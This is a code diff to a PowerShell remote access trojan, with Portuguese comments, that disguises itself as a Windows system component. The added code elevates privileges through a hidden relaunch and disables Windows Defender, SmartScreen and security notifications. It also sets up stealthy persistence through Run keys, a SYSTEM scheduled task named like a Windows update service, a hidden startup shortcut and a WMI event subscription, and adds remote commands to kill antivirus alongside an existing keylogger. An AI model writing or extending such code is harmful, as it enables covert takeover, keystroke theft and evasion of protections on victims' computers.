@@ -1,4 +1,4 @@
-=<#
+<#
 .SYNOPSIS
 Windows Critical System Component
 .DESCRIPTION
@@ -19,6 +19,19 @@ $wallpaperPath = "$env:TEMP\wallpaper.bmp"
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0, $false)) { exit }
 
+# ===== VERIFICAR ADMIN =====
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    # Se não for admin, tentar elevar
+    try {
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
+        exit
+    } catch {
+        # Continua sem admin (funcionalidades limitadas)
+    }
+}
+
 # ===== LOGS FAKES =====
 Write-Host ""
 Write-Host "==================================================================" -ForegroundColor Cyan
@@ -34,9 +47,49 @@ $totalRAM = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemo
 Write-Host "RAM: $totalRAM GB" -ForegroundColor Gray
 $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" } | Select-Object -First 1).IPAddress
 Write-Host "IP: $ip" -ForegroundColor Gray
+Write-Host "Admin: $isAdmin" -ForegroundColor $(if($isAdmin){"Green"}else{"Yellow"})
 Write-Host "===============================================================" -ForegroundColor White
 Start-Sleep -Seconds 1
-Write-Host "[OK] Sistema inicializado com sucesso" -ForegroundColor Green
+
+# ===== DESABILITAR WINDOWS DEFENDER =====
+if ($isAdmin) {
+    Write-Host "[+] Desabilitando Windows Defender..." -ForegroundColor Yellow
+    
+    try {
+        # Desabilitar proteção em tempo real
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
+        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+        
+        # Desabilitar via Registry (mais persistente)
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWORD -Force | Out-Null
+        
+        # Desabilitar SmartScreen
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType DWORD -Force | Out-Null
+        
+        # Desabilitar notificações do Defender
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -PropertyType DWORD -Force | Out-Null
+        
+        # Adicionar exclusão para este script
+        Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\Caches" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+        
+        Write-Host "[OK] Windows Defender desabilitado" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Erro ao desabilitar Defender: $_" -ForegroundColor Red
+    }
+} else {
+    Write-Host "[!] Sem privilégios de Admin - Defender não pode ser desabilitado completamente" -ForegroundColor Yellow
+}
+
 Start-Sleep -Seconds 1
 
 # ===== ESCONDE JANELA =====
@@ -49,10 +102,12 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== PERSISTÊNCIA =====
+# ===== PERSISTÊNCIA AVANÇADA =====
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
 
-# Criar diretório se não existir
+Write-Host "[+] Configurando persistência..." -ForegroundColor Yellow
+
+# Criar diretório
 New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
 
 # Copiar script
@@ -60,15 +115,113 @@ if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
     Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force -ErrorAction SilentlyContinue
 }
 
-# Registry (Startup)
+# MÉTODO 1: Registry Run (HKCU e HKLM)
 try {
+    # HKCU (usuário atual)
     $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
     Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
-} catch {}
+    
+    # HKLM (todos os usuários) - requer admin
+    if ($isAdmin) {
+        $regPathLM = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty -Path $regPathLM -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
+    }
+    
+    Write-Host "[OK] Persistência Registry configurada" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Erro no Registry: $_" -ForegroundColor Red
+}
+
+# MÉTODO 2: Task Scheduler (mais difícil de remover)
+if ($isAdmin) {
+    try {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        
+        # Trigger 1: Ao fazer logon
+        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
+        
+        # Trigger 2: A cada 10 minutos (caso seja morto)
+        $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)
+        
+        # Trigger 3: Na inicialização do sistema
+        $trigger3 = New-ScheduledTaskTrigger -AtStartup
+        
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
+        
+        Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force | Out-Null
+        
+        Write-Host "[OK] Task Scheduler configurado" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Erro no Task Scheduler: $_" -ForegroundColor Red
+    }
+}
+
+# MÉTODO 3: Startup Folder
+try {
+    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $lnkPath = "$startupFolder\WindowsUpdate.lnk"
+    
+    $WshShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut($lnkPath)
+    $Shortcut.TargetPath = "powershell.exe"
+    $Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $Shortcut.WindowStyle = 7 # Minimized
+    $Shortcut.Save()
+    
+    # Ocultar o atalho
+    (Get-Item $lnkPath -Force).Attributes = 'Hidden'
+    
+    Write-Host "[OK] Startup Folder configurado" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Erro no Startup Folder: $_" -ForegroundColor Red
+}
+
+# MÉTODO 4: WMI Event Subscription (requer admin - muito difícil de detectar)
+if ($isAdmin) {
+    try {
+        $filterName = "WindowsUpdateFilter"
+        $consumerName = "WindowsUpdateConsumer"
+        
+        # Remover existentes
+        Get-WmiObject __eventFilter -namespace root\subscription -filter "name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
+        Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
+        Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.Filter -like "*$filterName*" } -ErrorAction SilentlyContinue | Remove-WmiObject
+        
+        # Criar filtro (executa a cada 15 minutos)
+        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 900 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
+            Name = $filterName
+            EventNameSpace = 'root\cimv2'
+            QueryLanguage = "WQL"
+            Query = $query
+        }
+        
+        # Criar consumer
+        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+            Name = $consumerName
+            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        }
+        
+        # Bind
+        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+            Filter = $WMIEventFilter
+            Consumer = $WMIEventConsumer
+        } | Out-Null
+        
+        Write-Host "[OK] WMI Event Subscription configurado" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Erro no WMI: $_" -ForegroundColor Red
+    }
+}
 
 # Ocultar arquivo
 Start-Sleep -Milliseconds 500
 attrib +h +s +r $scriptPath 2>$null
+
+Write-Host "[OK] Persistência completa configurada" -ForegroundColor Green
+Start-Sleep -Seconds 1
 
 # ===== FUNÇÕES BASICAS =====
 Add-Type -AssemblyName System.Windows.Forms
@@ -98,6 +251,57 @@ if (-not (Test-Path $userListFile)) {
     $users = Get-Content $userListFile -ErrorAction SilentlyContinue
     if ($users -notcontains $currentUser) {
         Add-UserToList $currentUser
+    }
+}
+
+# ===== DESABILITAR ANTIVIRUS (COMANDO) =====
+function Disable-Antivirus {
+    if (-not $isAdmin) {
+        return "ANTIVIRUS_DISABLE_ERROR: Requer privilégios de administrador"
+    }
+    
+    try {
+        # Windows Defender
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+        
+        # Registry
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force | Out-Null
+        
+        # Parar serviços
+        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+        Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+        
+        return "ANTIVIRUS_DISABLED"
+    } catch {
+        return "ANTIVIRUS_DISABLE_ERROR: $_"
+    }
+}
+
+function Enable-Antivirus {
+    if (-not $isAdmin) {
+        return "ANTIVIRUS_ENABLE_ERROR: Requer privilégios de administrador"
+    }
+    
+    try {
+        # Windows Defender
+        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
+        
+        # Registry
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Force -ErrorAction SilentlyContinue
+        
+        # Iniciar serviços
+        Set-Service -Name WinDefend -StartupType Automatic -ErrorAction SilentlyContinue
+        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
+        
+        return "ANTIVIRUS_ENABLED"
+    } catch {
+        return "ANTIVIRUS_ENABLE_ERROR: $_"
     }
 }
 
@@ -486,12 +690,41 @@ function Stop-Keylogger {
 # ===== DESINSTALAR =====
 function Uninstall-RAT {
     try {
-        # Remover Registry
+        # Remover Registry HKCU
         Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -ErrorAction SilentlyContinue
+        
+        # Remover Registry HKLM
+        if ($isAdmin) {
+            Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -ErrorAction SilentlyContinue
+        }
+        
+        # Remover Task Scheduler
+        if ($isAdmin) {
+            Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
+        }
+        
+        # Remover Startup
+        $startupLnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
+        Remove-Item $startupLnk -Force -ErrorAction SilentlyContinue
+        
+        # Remover WMI
+        if ($isAdmin) {
+            Get-WmiObject __eventFilter -namespace root\subscription -filter "name='WindowsUpdateFilter'" -ErrorAction SilentlyContinue | Remove-WmiObject
+            Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='WindowsUpdateConsumer'" -ErrorAction SilentlyContinue | Remove-WmiObject
+            Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.Filter -like "*WindowsUpdateFilter*" } -ErrorAction SilentlyContinue | Remove-WmiObject
+        }
         
         # Remover arquivo
         attrib -h -s -r $scriptPath 2>$null
         Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+        
+        # Reativar Defender
+        if ($isAdmin) {
+            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+            Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Force -ErrorAction SilentlyContinue
+            Set-Service -Name WinDefend -StartupType Automatic -ErrorAction SilentlyContinue
+            Start-Service -Name WinDefend -ErrorAction SilentlyContinue
+        }
         
         # Sair
         exit
@@ -538,6 +771,8 @@ while ($true) {
                 "set_wallpaper" { $writer.WriteLine((Set-HackWallpaper)) }
                 "keylog_start" { $writer.WriteLine((Start-Keylogger)) }
                 "keylog_stop" { $writer.WriteLine((Stop-Keylogger)) }
+                "disable_antivirus" { $writer.WriteLine((Disable-Antivirus)) }
+                "enable_antivirus" { $writer.WriteLine((Enable-Antivirus)) }
                 "uninstall" { $writer.WriteLine((Uninstall-RAT)) }
                 "exit" { break }
                 "move *" { 
